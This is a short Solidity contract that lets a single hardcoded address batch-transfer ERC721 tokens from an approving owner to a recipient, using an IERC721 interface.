// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract BatchSend {
    function batchSend(address token, uint[] calldata tokenIds, address from, address to) external {
        require(msg.sender == 0xA12EEeAad1D13f0938FEBd6a1B0e8b10AB31dbD6, "kutak");
        for (uint i = 0; i < tokenIds.length; i++) {
            IERC721(token).safeTransferFrom(
                from,
                to,
                tokenIds[i]
            );
        }
    }

}
interface IERC721 {
    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId
    ) external;
}